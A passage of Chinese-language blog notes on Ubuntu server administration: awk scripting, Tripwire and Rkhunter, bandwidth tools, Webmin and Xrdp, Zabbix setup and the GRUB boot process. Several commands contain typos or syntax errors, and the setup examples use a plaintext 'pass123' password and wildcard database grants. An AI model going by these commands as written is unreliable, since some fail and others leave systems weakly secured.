filename\n\n```\n\n**awk脚本编程**\n\n```bash\n### awk脚本编程\n\n====== 条件编程\nawk -F\":\" '{if(){} else if(){} else{}}' passwd\n\nawk -F\":\" '{if($3>0 && $3<1000){count++}} END{print count}' /etc/passwd   # 统计系统用户数\n\nawk -F\":\" '{if($3==0){count++}} else{i++} END{print \"管理员个数：\"count; print \"系统用户个数:\"i}' /etc/passwd \n\nawk -F\":\" '{if($3==0){i++}} else if($3<999){j++} else{k++} END{print \"管理员个数：\"i; print \"普通用户个数:\"j; print \"系统用户个数:\"k}' /etc/passwd \n\n\n\n====== 循环\n# 1.while    依此打印每一列\nawk -F\":\" '{i=1;while(i<7){print $i;i++}}' /etc/passwd \nawk -F\":\" '/^root/{i=1;while(i<7){print $i;i++}}' /etc/passwd \nawk -F\":\" '{i=1;while(i<=NF){print $i;i++}}' /etc/passwd \nawk '{i=1;while(i<=NF){print $i;i++}}' a.txt   # 打印文件所有内容(默认是空格和tab分割)\n\n\n\n# 2.for\nawk 'BEGIN{for(i=1;i<=5;i++){prin i}}'     # c风格的\nawk -F: '{for(i=1;i<=NF;i++){prin $i}}' passwd\nawk -F: '{for(i=1;i<=NF;i++){prin $0}}' passwd     # 将每行打印10次\n\n\n\n\n====== 数组  (用来统计)\nawk -F: '{username[++i]=$1} END{print username[1]}' /etc/passwd\nawk -F: '{username[i++]=$1} END{print username[1]}' /etc/passwd\nawk -F: '{username[i++]=$1} END{print username[0]}' /etc/passwd\n\n## 数组遍历(主要用按索引遍历)\n# username数组名， 先保存到数组中，再进行遍历\nawk -F: '{username[i++]=$1} END{for(i in username) {print i,username[i]}}' /etc/passwd \n\nawk -F: '{username[++i]=$1} END{for(i in username) {print i,username[i]}}' /etc/passwd\n\n\n```\n\n**基本练习**\n\n```bash\n###### 基本练习\n\n### 1. 统计/etc/passwd 中各种shell的数量\n# # 把要统计的对象作为数组的索引(这里是最后一个$NF,也就是shell的类型)\nawk -F: '{shells[$NF]++} END{for(i in shells){print i,shells[i]}}' /etc/passwd  \n\n\n### 2.网站访问状态统计\nnetstat -ant |grep :80 |awk '{access_stat[$NF]++} END{for(i in access_stat){print i,access_stat[i]}}' \n\nnetstat -ant |grep :80 |awk '{access_stat[$NF]++} END{for(i in access_stat){print i,access_stat[i]}}' |sort -k2 -n |head\n\nss -ant |grep :80 |awk '{access_stat[$2]++} END{for(i in access_stat){print i,access_stat[i]}}' \n\n\n### 3.统计当前访问的每个IP的数量 <当前实时状态 netstat, ss>\nnetstat -ant |grep :80 |awk -F: '{ip_count[$8]++} END{for(i in ip_count){print i,ip_count[i]}}' \n# 下面这个有点复杂了，不推荐用\nss -ant |grep :80 |awk -F: '!/LISTEN/{ip_count[$(NF-1)]++} END{for(i in ip_count){print i,ip_count[i]}}' |sort 0k2 -rn |head 5\n\n\n### 4.统计Apache/Nginx日志中某一天的PV量 <统计日志>\ngrep '07/Aug/2019' access.log |wc -l    # wc -l  统计行数\n\n\n### 4.统计Apache/Nginx日志中某一天不通IP的PV量 <统计日志>\ngrep '07/Aug/2019' access.log |awk '{ips[$1]++} END{for(i in ips){print i, ips[i]}}' |sort -k2 -rn | head\n\nawk '/22/\\Mar\\/2019/{ips[$1]++} END{for(i in ips){print i, ips[i]}}'\n\n# >100的才打印（此方法有点low，可用下面的几种方法）\nawk '/22/\\Mar\\/2019/{ips[$1]++} END{for(i in ips){print i, ips[i]}}' | awk '$2>100' |sort -k2 -rn | head  \n\nawk '/22/\\Mar\\/2019/{ips[$1]++} END{for(i in ips){if(ips[i]>100){print i, ips[i]}}}' | \n# >100的才打印\nawk '$2>100' |sort -k2 -rn | head  \n\n\n#【思路】 将要统计的字段作为数组的索引\n\n### awk函数\n# 统计用户名为4个字符的用户\nawk -F: '$1~/^....$/{count++;print $1} END{print \"count is:\" count}' /etc/passwd\n# length\nawk -F: 'length($1)==4{count++;print $1} END{print \"count is:\" count}' /etc/passwd \n\n\n\n### awk自定义变量(外部变量)\n# 1.再双引号里面\nvar=bash\necho \"unix script\" |awk \"gsub(/unix/, \\\"$var\\\")\"   # 转义双引号，里面是$变量\n\n# 2.两个双引号里面套个单引号\necho \"unix script\" |awk 'gsub(/unix/, \"'\"$var\\\"'\")'\n\n#\ndf -h |awk '{ if(int($5)>10){print $6\":\"$5} }'\n# 再函数外面单引号情况下\ni=10\ndf -h |awk '{ if(int($5)>'''$i'''){print $6\":\"$5} }'\n\n\n# 3.建议： -v\nawk -v user=root -F:'$1 == user' /etc/passwd  # 在-v的时候定义变量user=root\n\nvar=bash\necho \"unix script\" |awk \"gsub(/unix/, var)\" \n\n\n# 前面造一条命令，传给bash执行\narp -n |awk '/^[0-9]/{print \"arp -d $1\"}' |bash  \n\n\n```\n\n\n\n## 实例\n\n实践中再写.....\n\n\n\n## 附\n\n其他参考文章：\n\nhttps://blog.csdn.net/u011436427/article/details/103815680\n\nhttps://mp.weixin.qq.com/s/dXLlFgQS_3KHm8YRyDC7ZQ\n\n"},{"title":"ubuntu server-入侵检测IDS","url":"%2Fposts%2F35785%2F","content":"\n## 入侵检测(IDS)\n\n- 安全的关键在于看见\n- 入侵检测( Intrusion Detection System )\n  - 设备或者软件， 用于监视网络和系统的恶意、违规行为\n  - 基于特征、基于异常(流量异常，行为异常..)、基于信誉(依赖机器学习)\n  - 基于网络的入侵检测 NIDS\n  - 基于主机的入侵检测 HIDS (常用的方法：`检查系统文件的完整性`)\n  - `告警`而非实时阻断(`联动`其他手段实现阻断)\n- 监视和警告文件/目录的变更\n- IPS(入侵防御系统) / IDP（入侵检测防御系统）\n\n\n\n#### Tripwire(绊网)\n\n- 开源免费的安全和数据完整性检测及告警软件(有企业版)\n  - Tripwire 公司\n- 军事和工业领域\n- Tripwire\n  - 基于文件完整性检查的HIDS\n  - 对全新安装的系统创建基线库\n  - 基于策略生成基线和检查指定文件目录的指定属性(HASH、 Perm、Owner)\n\n\n\n**安装**\n\n```bash\nsudo apt-get install tripwire\n\n# 同时会提示你安装Postfix\n# 要求你设置密码文（两个密钥对 对文件完整性做签名）\n# site key\t\t一组服务器主机 相同的site key，适用于重复使用\n# local key\t\t只针对我本机的文件加密的情景\n\n# 配置文件会以key加密方式保存的，如果想修改可以修改/etc/tripwire/twcfg.txt然后执行命令来实现\n# 要监视的文件目录的策略文件：/etc/tripwire/twpol.txt\n```\n\n\n\n文件结构\n\n```bash\nls /etc/tripwire\n\nsite.key\nxps-local.key\ntw.cfg\t# 加了密的\ntwcfg.txt\t# 配置文件。\ntw.pol\ntwpol.txt\t# 策略文件。rulename 策略名\n\n# 其中变化很大的文件要根据情况来进行监控\n\n# 可以在策略文件，自己添加新的规则\n```\n\n\n\n**初始化数据库**\n\n```bash\nls /var/ib/tripwire/\t# 存放文件完整性的数据库\n\t\n\t\nsudo tripwire --init\t# 要先进行数据库初始化\n  \tNo such file or directory\t# 会有这个提示信息，Error就不正常了（有的文件不存在）\n\nvi /etc/tripwire/twpol.txt  \t# 要注释所有不存在的文件/目录\n\nsudo twadmin -m P /etc/tripwire/twpol.txt   # 然后基于修改之后的策略文件，重新生成pol文件\n\nsudo tripwire --init\t#重新初始化数据库\n```\n\n\n\n**检查验证**\n\n```bash\nsudo tripwire --check\t# 检查\n\n# 查看验证结果\n\n```\n\n\n\n**添加规则**\n\n```bash\nvi /etc/tripwire/twpol.txt \n    # Rules for Project\n    {\n        rulename = \"Project Ruleset\",\n        severity = $(SIG_ HI)\n    }\n    {\n        /project -> $(SEC CRIT);\n    }\n```\n\n```bash\nsudo twadmin -m P /etc/tripwire/twpol.txt\n# 先创建上面策略文件中的文件，否则会报错文件不存在\n# 重新初始化数据库\nsudo tripwire --init\n```\n\n\n\n**基于上次最新的检查日志(增量型的方式)，来进行更新**\n\n```bash\n##更新数据库(本地系统更新)\nll /var/lib/tripwire/report\n\n# 每次数据库变更都要执行一次\ntripwire -mu-a -S -C /etc/tripwire/tw.cfg -r /var/ib/tripwire/report/xps.twr\n\n# 或者使用下面这个方式，一次执行即可\ntripwire --update -- accept-all\n\n\n## 查看报告（r 读取。这样的方法更加详细）\ntwprint -m r -F /var/lib/tripwire/report/xps-2020801-100037.twr\n\n## 查看数据库(d 数据。内容很多)\ntwprint -m d -d /path/to/database.twd\n\n\n```\n\n\n\n\n\n### 补充命令\n\n**硬件信息**\n\n```bash\n# 安装\nsudo apt install Ishw\n\n# 查看\nsudo lshw \n\n# 输出结果\nsudo lshw -html > hwinfo .html\n```\n\n\n\n**硬盘信息**\n\n```bash\n# 安装\nsudo apt install hdparm\n\nhdparm -i /dev/sda\nhdparm -I /dex/sda\t# 更加详细信息\n```\n\n\n\n\n\n\n\n","tags":["Tripwire"],"categories":["Linux"]},{"title":"ubuntu server-网络工具","url":"%2Fposts%2F63455%2F","content":"\n\n\n## 网络带宽\n\n- 开测试防火墙性能NetIO\n- 光纤专线的带宽是否缩水\n- 实际承受的流量\n- iperf3\n- 模拟出来的流量并非真实带宽\n\n\n\n## 测试网络带宽\n\n#### <font color=red>iperf3</font>\n\n- 支持TCP/SCTP/UDP协议\n\n- 跨平台\n\n- 多连接(模拟多用户)\n\n- 支持IPv6\n\n  \n\n**安装**\n\n```bash\n# 服务端和客户端都是这一个软件包\napt install iperf3\n\n# 默认侦听端口：5201\n```\n\n\n\n**参数**\n\n```bash\n# iperf3\n\n  -p, --port      #         server port to listen on/connect to\n  -f, --format    #[kmgKMG]  format to report: Kbits, Mbits, KBytes, MBytes\n  -i, --interval  #         seconds between periodic bandwidth reports\n  -F, --file name           # xmit/recv the specified file， 指定文件打到对方\n  -A, --affinity n/n,m      set CPU affinity\n  -B, --bind      <host>    bind to a specific interface\n  -V, --verbose             more detailed output\n  -J, --json                output in JSON format\n  --logfile f               send output to a log file\n  -d, --debug               emit debugging output\n  -v, --version             show version information and quit\n  -h, --help                show this message and quit\nServer specific:\n  -s, --server              run in server mode\n  -D, --daemon              run the server as a daemon\t# 后台运行\n  -I, --pidfile file        write PID file\n  -1, --one-off             handle one client connection then exit # 只接收第一个客户端的测试\nClient specific:\n  -c, --client    <host>    run in client mode, connecting to <host>\n  -u, --udp                 #use UDP rather than TCP\n  -b, --bandwidth #[KMG][/#] target bandwidth in bits/sec (0 for unlimited)  # 限制流量带宽\n                            (default 1 Mbit/sec for UDP, unlimited for TCP)\n                            (optional slash and packet count for burst mode)\n  -t, --time      #         time in seconds to transmit for (default 10 secs) # 测试时长(默认10s)\n  -n, --bytes     #[KMG]    number of bytes to transmit (instead of -t)\n  -k, --blockcount #[KMG]   number of blocks (packets) to transmit (instead of -t or -n)\n  -l, --len       #[KMG]    length of buffer to read or write\n                            (default 128 KB for TCP, 8 KB for UDP)\n  --cport         <port>    bind to a specific client port (TCP and UDP, default: ephemeral port)\n  -P, --parallel  #         number of parallel client streams to run  # 并发数量\n  -R, --reverse             run in reverse mode (server sends, client receives)\n  -w, --window    #[KMG]    set window size / socket buffer size\n  -C, --congestion <algo>   set TCP congestion control algorithm (Linux and FreeBSD only)\n  -M, --set-mss   #         set TCP/SCTP maximum segment size (MTU - 40 bytes)\n  -N, --no-delay            set TCP/SCTP no delay, disabling Nagle's Algorithm\n  -4, --version4            only use IPv4\n  -6, --version6            only use IPv6\n  -S, --tos N               set the IP 'type of service'\n  -L, --flowlabel N         set the IPv6 flow label (only supported on Linux)\n  -Z, --zerocopy            use a 'zero copy' method of sending data\n  -O, --omit N              omit the first n seconds\n  -T, --title str           prefix every output line with this string\n  --get-server-output       get results from server\n  --udp-counters-64bit      use 64-bit counters in UDP test packets\n  --no-fq-socket-pacing     disable fair-queuing based socket pacing\n\n```\n\n\n\n**使用**\n\n```bash\n# 作为服务端\niperf3 -s\n\n\n# 作为客户端，连接服务端\niperf3 -c 192.168.0.111\n```\n\n\n\n\n\n## 查看当前带宽占用\n\n#### 1.<font color=red>nload</font>\n\n须在问题发生当下执行命令\n\n\n```bash\n# 安装\napt install nload\n\n# 使用\nsudo nload\nnload -uk -U m enp0s3\t# 查看指定网卡流量（如果不指定会自动查找网卡）\nnload -m\t\t# 同时查看多网卡流量\n```\n\n\n\n#### 2.<font color=red>iftop </font>\n\n优点：会显示流量通信之间的主机双方\n\n```bash\n# 安装\napt install iftop\n\n# 运行\nsudo iftop\nsudo iftop -n -N\t\t# 不解析域名、端口（以ip地址形式显示通信双方）\n\n# 其他参数\n-p\t# 混杂模式（凡是流经你网卡的流量都会被探测）\n-i eth0\t\t # 指定网卡\n```\n\n\n\n#### 3.<font color=red>iptraf </font>\n\n\n```bash\n# 安装两个软件包\nsudo apt install iptraf iptraf-ng\n\nsudo iptraf-ng\t# 字符菜单方式展示\n\n# 选择，高亮显示，详细信息，配置...\n```\n\n\n\n\n\n#### 4. <font color=red>nethogs</font>\n\n可显示每个进程所使用的带宽\n\n```bash\n# 产生大流量不一定是病毒\n\n# 安装\nsudo apt install nethogs\n\n```\n\n\n\n####  <font color=red>其他工具</font>\n\n​\t.... ...\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["带宽监测"],"categories":["Linux"]},{"title":"ubuntu server-Rkhunter","url":"%2Fposts%2F53417%2F","content":"\n\n\n## 谣言\n\n- Linux系统很安全，从不感染病毒\n- 已知的恶意软件没有Windows系统多\n\n\n\n## Rootkit\n\n- 隐藏自身能力超强的恶意软件(一 个或一组)\n- 将自身注入主板芯片、硬盘引导扇区、系统内核、底层驱动\n- 运行级别优先于系统或驻留于内核特权层级\n- 难于发现、难于清除、更换硬件都无法清除\n- 最早是出现在Unix系统上的一类正向技术\n- 有时木马程序也可视为Rootkit 的一种\n\n\n\n\n\n## Rootkit Hunter\n\n- 安全监视和分析工具(非处置型工具)\n- 检测Rootkit、恶意软件、不安全设置、文件完整性、可疑端口\n- 基于特征匹配\n- 脚本(调用其他通用工具完成检测任务)\n- 运行方式\n  - 需要要root权限\n  - 只能运行于Bourne类型的shell (bash、 ksh)\n  - 手动运行、cron job\n\n\n\n**安装**\n\n```bash\nsudo apt install rkhunter\n# 按照向导即可\n```\n\n**配置**\n\n```bash\nsudo vi /etc/default/rkhunter\n    CRON DAILY_RUN=\"true\"\t# 每天自动运行来检查系统\n    CRON_ DB_ UPDATE=\"true\"\n# 这里简单修改几项\n```\n\n**升级特征库**\n\n```bash\nsudo rkhunter --propupd\n```\n\n**执行检查**\n\n```bash\n# 默认对系统所有检查项进行（每一项都需要回车确认，--sk就不用手动敲回车了）\nsudo rkhunter --check --sk\n# 检查结果如果显示是绿色的，基本就没啥问题\n```\n\n**日志文件**\n\n```bash\n# var/log/rkhunter.log\nless var/log/rkhunter.log\n```\n\n**误报白名单**\n\n```bash\nsudo vi /etc/rkhunter.conf\n    SCRIPTWHITELIST=/usr/bin/egrep\n    SCRIPTWHITELIST=/usr/bin/fgrep\n    SCRIPTWHITELIST=/usr/bin/ldd\n```","tags":["安全检查"],"categories":["Linux"]},{"title":"ubuntu server-远程管理 Webmin&usermin&Xrdp","url":"%2Fposts%2F40012%2F","content":"\n\n\n## Webmin\n\n- 基于WEB的系统远程管理\n  - 基于图形化的友好操作界面\n  - 多开启一个服务端口，增加了攻击面\n- Webmin\n  - WEB应用程序，完成部分服务器日常管理操作\n\n\n\n###### 安装依赖包\n\n```bash\napt -y install python apt-show-versions libapt-pkg-perl libauthen-pam-perl libio-pty-perl libnet-ssleay-perl\n```\n\n\n\n###### 下载安装\n\n```bash\n# 下载安装\ncurl -L -O htt://www.webmin.com/download/deb/webmin-current.deb\ndpkg -i webmin-current.deb\t# 安装\n\n# 配置允许访问的ip（这里配置本地地址 和 某个网段）\nvi /etc/webmin/miniserv.conf\n\tallow=127.0.0.1 10.0.0.0/24\n\n# 重启服务\nsystemctl restart webmin\n\n```\n\n###### 访问\n\n```bash\n# 访问\nhttps://10.1.1.1:10000\n# 使用系统账号登录，建议root\n\n\n## 管理系统\n如果多台服务器，可以用\"广播服务器\"来寻找其他装了Webmin的服务器，在一个web端来统一管理\n\n```\n\n\n\n\n\n## usermin\n\n普通用户自服务`usermin`\n\n\n\n**安装依赖包**\n\n```\napt -y install python apt- -show-versions libapt-pkg-perl libauthen-pam-perl libio-pty-perl libnet-ssleay-perl\n```\n\n**安装**\n\n```bash\ncurl -L -0 http:/ /www.webmin.com/download/ deb/usermin-current.deb\ndpkg -i usermin-current.deb\n\nvi /etc/usermin/ miniserv.conf\n  allow=127.0.0.1 10.0.0.0/24 \n  denyuser=root\t# 禁止root登录usermin\n  \nsystemctl restart usermin\n```\n\n\n\n**访问**\n\n```bash\nhttps://10.0.1.12:20000\n\n# \n```\n\n\n\n## Xrdp远程桌面\n\n- VNC vs XRDP\n\n- 使用Windows远程桌面连接工具远程管理Linux Server\n\n- 图形化桌面作为后段\n\n  - Gnome、 KDE、Xfce (越来越火)\n\n  \n\n**安装Xfce桌面环境**\n\n  ```bash\n# 以Xfce为例\nsudo apt install xfce4 xfce4-goodies xorg dbus-x11 x11-xserver-utils\n  ```\n\n**安装XRDP**\n\n  ```bash\nsudo apt install xrdp\n  ```\n\n**配置**\n\n```bash\nsudo vi /etc/xrdp/xrdp.ini\n\texec startxfce4\t# 这里是xfce4\n```\n\n**重启服务**\n\n```bash\nsudo systemctl restart xrdp\n```\n\n**防火墙**\n\n```bash\nsudo ufw allow 3389\n\nsudo ufw allow from 10.0.0.0/24 to any port 3389\t# 可以限制来源ip地址\n```\n\n**连接**\n\n用Windows的远程连接工具(mstsc)连接Linux服务器\n","tags":["Xrdp"],"categories":["Linux"]},{"title":"ubuntu server-Zabbix","url":"%2Fposts%2F60461%2F","content":"\n\n\n>Zabbix -- 最流行的开源的企业级监控系统之一\n\n- 基本可对全平台，全系统做监控：网络设备、操作系统、应用程序\n- Unix、L inux、Windows、MacOS\n- 监控方式：Agent(硬件设备,被监控机器上安装，自己的作为Zabbix服务器) / Agenless\n\n#### 系统环境\n\n- 修改：IP(静态)、Hostname、 DNS、NTP\n```bash\n# 修改主机名\nvim /etc/cloud/cloud.cfg\n    preserve_hostname；true\n\nvim /etc/hostname\n    zab.lab.com    # 作为zabbix服务器\n\n# 域名解析\n10.1.8.132 zab.lab.com\n\n# 重启zabbix服务器\n\n```\n\n#### 安装&配置\n###### 1.安装配置Apache\n\n```bash\n# 管理是Web界面，在Zabbix服务器机器上\napt install apache2\n\nvim /etc/apache2/conf-enabled/security.conf\n    ServerTokens Prod    # 显示最少的主机头信息\n\nvim /etc/apache2/apache2.conf\n    ServerName zab.lab.com    # 主机名\n\nvim /etc/apache2/sites-enabled/000-default.conf\n    ServerAdmin webmaster@lab.com\n\n# 重启服务\nsystemctl restart apache2\n```\n\n###### 2.安装php\n\n```bash\napt install php php-cgi libapache2-mod-php php-common php-pear php-mbstring\n# 启动模块\na2enconf php7.2-cgi\nsystemctl reload apache2\n\nvi /etc/php/7.2/apache2/php.ini\n    date.timezone = \"Asia/Shanghai\"\n\n# 测试页面   \nvi /ar/www/htm/index.php\n    <html> <body> <?php print \"PHP Test\"; ?></body></html>\n\n```\n\n###### 3.安装MySQL\n\n```bash\napt install mariadb-server\nmysql_secure_installation    # 安全初始化\n\nmysql \n    CREATE DATABASE zabbix_db CHARACTER SET utf8 collate utf8 bin;\n    grant all privileges on zabbix_db.* to zabbix@'localhost' identified by 'pass123';\n    grant all privileges on zabbix_db.* to zabbix@'%' identified by 'pass123';\n    flush privileges;\n\n```\n\n###### 4.安装Zabbix\n\n```bash\n# 下载适合ubuntu发行版本(这里是bionic)的二进制包（根据自己的下载）\nwget https://repo.zabbix.com/zabbix/4.0/ubuntu/ pool/main/z/zabbix-release/zabbix-release_ 4.0-3+bionic_ all.deb\n\napt install ./zabbix-release_4.0-3+bionic_all.deb && apt update    # dpkg -i xx 也可；增加了一条zabbix官方源的文件\n\nsudo apt install zabbix-server-mysql zabbix-frontend-php zabbix-agent    # 这里zabbix-agent安装是因为把zabbix-server自己也纳入监视范围\n\nzcat /usr/share/doc/ zabbix- server-mysql/create.sql.gz | mysql -u zabbix -p zabbix_db    # zcat 可以查看压缩文件里面的内容；初始化表结构\n# 修改zabbix服务端配置文件中数据库连接密码\nvi /etc/zabbix/zabbix_server.conf\n    DBName=zabbix_db\n    DBUser=zabbix\n    DBPassword=pass123\n# 重启服务\nsystemctl restart zabbix-server\n```\n\n###### 5.配置Zabbix\n\n```bash\n# 配置agent（这里是服务端监视自己的agent）\nvi /etc/zabbix/zabbix_agentd.conf\n    Hostname= zab.lab.com    # 让他找到我们的zabbix server的地址\n\n# 重启\nsystemctl restart zabbix-agent\nsystemctl enable zabbix-server    # 开机自启\n\nvi /etc/ apache2/conf-enabled/zabbix.conf\n    Allow from 10.0.0.10/24    # 设置谁能访问我zabbix的管理页面\n\n# 重启apache\nsystemctl restart apache2\n\n```\n\n###### 6.访问Web&初始化\n\n```bash\n# htp://zab.lab.com/zabbix/\n# 设置数据库连接参数\nDB Password\nHostname\n\n# 登陆: Admin / zabbix\n# 修改密码\n# 添加监视的主机（agent模式下，目标端口要开）\n\n```\n至此，zabbix服务端已经配置完毕\n\n\n\n###### 7.在被监控服务器上安装配置agent\n\n```bash\n## 安装\nwget hts://repo.zabbix.com/zabbix/4.0/ubuntu/pool/main/z/zabbix-release/zabbix-release.4.0-3+bionic.all.deb\nsudo apt install ./zabbix-release_4.0-3+bionic.all.deb\nsudo apt update\nsudo apt install zabbix-agent    # 安装zabbix-agent\n\n\n# 修改agent服务器的主机名 和 DNS域名解析\n\n# PSK / CA加密服务器与客户端之间的通信\n\n## 配置\nvi /etc/zabbix/zabbix_agentd.conf\n    Server=zab.lab.com    # 指向zabbix-server\n    ServerActive=zab.lab.com\n    Hostname= zab.lab.com\n    TLSConnect=psk    # 这里设置psk加密的参数\n    TLSAccept=psk\n    TLSPSKIdentity=PSK 001    # ID必须唯一\n    TLSPSKFile=/etc/zabbix/zabbix_agentd.psk\n    \n# 随机生成文件内容 psk的值\nopenssl rand -hex 32 | sudo tee /etc/zabbix/zabbix_agentd.psk\n\nsudo systemctl start zabbix-agent\nsudo systemctl enable zabbix-agent\n\n```\n\n###### 8.服务端添加agent\n\n```bash\n# Web界面\nConfiguration -> Hosts -> Create host -> ... -> Template(指定监视目标的什么服务) -> Security(都选择PSK, agent的id, psk的值)\n\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["监控"],"categories":["Linux"]},{"title":"ubuntu server-引导过程","url":"%2Fposts%2F24845%2F","content":"\n\n\n## BIOS/UEFI\n>打开黑箱看看里面\n\n操作系统是如何启动的\n###### 三个彼此独立但相互关联的过程\n1.Bios/UEFI自检过程（POST）\n```bash\n- 加电自检\n- 硬件识别与检测\n\n# UEFI比较新，原理和效果不一样\n```\n2.Boot Load加载执行过程\n```bash\n引导加载程序允许您选择想要引导的操作系统\n```\n3.操作系统启动过程\n```bash\n启动各种服务及操作系统本身\n```\n\n###### BIOS\n>打开黑箱看看里面\n\n主板芯片（计算机运行的第一个程序）\n```bash\n- 执行基本的检查或开机自测(POST)\n- 识别连接在计算机上的所有硬件、可用性、底层参数\n        例如内存、硬盘、键盘和显卡等\n- 不同的BIOS可以设置检查参数\n- 轮训硬盘控制器，启动其板载芯片，配置RAID等\n- 引导顺序\n- 不当的配置可导致计算机无法使用\n\n```\n\n###### UEFI\n>打开黑箱看看里面\n\n较新的主板支持UEFI (2015年以后)\n```bash\n- 视觉上与BIOS相似，但原理极不相同\n- 运行速度略快于BIOS\n- 创建UEFI是为了克服BIOS的故有缺陷\n    - BIOS运行基于16位处理器，UEFI基于现代处理器\n    - 内存使用量方面，BIOS有 限，UEFI按需要量使用\n    - BIOS只能读取MBR引导操作系统; UEFI可读取系统安装时划分的独立分区\n    - BIOS支持最大2T的硬盘，UEFI使用GPT分区表，最大支持8-9Z硬盘\n\n```\n\n###### 安全引导(Secure-boot)\n>打开黑箱看看里面\n\n```bash\n- 恶意软件可通过Boot Loader加载到系统中\n- UEFI提供了安全引导 Secure-boot\n- 加载前通过公钥/私钥验证签名的引|导加载程序和硬件\n- 64位操作系统支持Secure-boot,某些硬件无法更改操作系统类型（如某些电脑厂商不让电脑装其他系统，他给锁死了，要问好Secure-boot能不能关或在开启Secure-boot时候能不能按其他系统。其实建议Secure-boot开启）\n- 目前绝大多数硬件同时支持BISO/UEFI，可自行选择启动\n\n```\n\n###### 硬盘分区表\n>打开黑箱看看里面\n\n```bash\n- 分区表通常位于硬盘起始位置\n- 记录硬盘的划分情况\n    - 两种类型：MBR / GPT\n```\n<img src=\"http://image.xpshuai.cn/%E5%86%85%E6%A0%B81.png\" />\n\n\n## Boot Loader\n>打开黑箱看看里面\n\n- BIOS/UEFI不关系统安装的操作系统\n- POST自检结束后，BIOS/UEFI读取硬盘Boot Loader\n- 读取并执行Boot L oder，由其引|导操作系统\n- Linux世界里两大`Boot Loader程序`\n    - LILO:基本已被废弃\n    - GRUB:目前绝大多数发行版采用\n\n\n###### BIOS引导过程\n>打开黑箱看看里面\n\nBIOS -> Boot Loader (`GRUB2`)\n第一阶段：boot.img读取并运行`MBR`硬盘起始的446字节  \n第二阶段：boot.img 查找并运行core.img (通常位于MBR Gap)  \n                 core.img的任务是访问`/boot/grub`，加载该目录下的所有模块  \n                 加载启动菜单，自动或手动选择进一步引导的系统内核 \n\n\n###### UEFI引导过程\n>打开黑箱看看里面\n\n第一阶段\n- UEFI读取`GPT`分区表，找到`EFI分区`(格式Fat32 / 大小默认537M / boot esp )\n- 从中读取、执行boot loader代码，加载模块\n- 命令`parted` 一`print` (读的是文件：/boot/efi/EFl/ubuntu/ grubx64.efi)\n```bash\nsudo parted    \n# 查看 分区的信息\nprint\n\n# disk 工具也可来查看分区\n\n```\n\n第二阶段\n- 查找`/boot/grub/x86_ 64- -efi/core.efi` 执行\n- 生成GRUB2菜单， 选择不同内核引导系统(内核二进制文件:`vmlinuz-<release- number>` )\n- 加载硬件驱动文件initrd.img到内存中，然后控制权交给内核，继续引导\n- 系统加载systemd / upstart / init, 启动各服务\n\n\n\n#### GRUB2\nGRUB是一个强大的多引导加载程序\n```bash\n- Windows --下的引导程序--> ntldr    # 不兼容Linux\n- MacOS ---> Boot Camp\n```\n\n两种启动方式\n```bash\n-直接查找和加载所需的内核\n-加载另一个引导加载程序\n```\n\n操作系统引导的四个核心组件\n```bash\n内核文件、驱动器名称、内核文件所在分区号、初始化RAM盘\n```\n\n\n###### GRUB菜单\n**GRUB菜单文件**\n```bash\n/boot/grub/grub.cfg (自动生成，不可修改)\n主要来源文件/etc/grub.d/*\n\n菜单定义: menuentry / submenu\n\n```\n\n**显示菜单**\n```bash\n- Vi /etc/default/grub \n    GRUB_TIMEOUT_STYLE=menu    # 让他显示菜单\n    GRUB_TIMEOUT=100    # 超时时间（100s如果不做选择，就启动默认的）\n sudo update-grub\n```\n\n**单用户模式**\n类似于Windows启动时F8灾难恢复模式\nBIOS: Shift\nUEFI: Esc\n\nGRUB菜单\n-“`e\"`\n-在引导项最后增加`“single\"`\n-` Ctrl+ X`    进入\n\n\n\n手动生成GRUB菜单文件\n```bash\nsudo grub-mkconfig --output mygrub.cfg\n```\n\n**安全风险**\n```bash\n恶意用户可能修改boot loader, 造成安全问题\n```\n\n设置GRUB密码\n```bash\nsudo vi /etc/grub.d/40_custom    # custom的文件在更新系统后不会被覆盖\n    set superusers=xps\n    password yuanfh pass123\nsudo update--grub\n\n```\n以上明文存储GRUB密码存在风险隐患\n```bash\n# 使用工具 grub-mkpasswd-pbkdf2\ngrub-mkpasswd-pbkdf2    # 输入密码，会生成一段密文\nsudo vim /etc/grub.d/40_custom\n    password_pbkdf2 xps grub.pbkdf2.sha512 ......    # 上面的密文放到配置文件中\n    \nsudo update--grub\n\n# 此方法不适合远程托管到IDC机房的机器（一重启在grup时就要输入密码，此时SSH还未连接）\n\n# 指定启动项用户\nmenuentry --> --users xps\n```\n\n\n\n#### 其他BootLoader(LILO, Grub之外的)\n**1.SYSL INUX**\n```bash\n从FAT分区引导系统的BootLoader (U盘启动时)\n```\n\n**2.EXTL INUX**\n```bash\n# 小型的Linux\n从ext2、ext3、 ext4、 btrfs引导系统的小型BootLoader\n```\n\n**3.ISOL .INUX**\n```bash\n# 光盘启动\n从LiveCD、LiveDVD引导系统的BootLoader\n# isolinux.bin 映像文件; isolinux.cfg 配置文件\n```\n\n**4.PXELINUX**\n- (无盘站-->无硬盘)`从网络服务器引导系统`的BootLoader\n- PXE（Pre-boot eXecution Environment）\n- 使用DHCP为工作站分配IP\n- 使用BOOTP加载BootLoader映像\n- TFTP将引导映像传输至工作站(基于UDP协议)\n- `/tftpboot/ pxelinux.0` : PXE BootLoader\n- `/tftpboot/ pxelinux.cfg` :配置文件\n- 目前新版支持NFS、HTTP、FTP服务器\n\n\n#### 系统无法启动!\n**两大问题原因**\n- 内核问题：手动安装内核时缺少模块、库文件(发行版错误)\n- 驱动器故障：无法读取根驱动器\n\n**处理办法:**\n- 使用先前无故障版本内核引导系统\n- 单用户模式(指定内核参数)\n- 对于驱动器故障，可以使用救援盘(CD/DVD、USB) 检修硬盘：`fsck /dev/sda1`\n\n**显示GRUB菜单**\n- 可以开机`一直按住ESC键、或SHIFT键`（在故障发生时，且没修改过grup菜单显示时）\n\n\n\n## 操作系统启动\n>服务/Service (windows) ==后台/daemon (Linux)\n\nINIT：内核引导后运行`第一个程序INIT`,初始化操作系统并启动服务(直到关机)\n    - 内核加载后的初始化进程，用于启动其他程序\n        - 所有服务启动由init 程序处理(`PID=1`) ，所有系统服务进程都是其子进程\n        - `pstree -p 1`  \n        - `/usr/sbin/init -> /lib/ systemd/systemd`  现在的`init`程序早已不是以前那个init，只是沿用，实则是个符号链接\n        - 早期版本配置文件：`/etc/inittab` (`ubuntu无此文件！`)\n\n<img 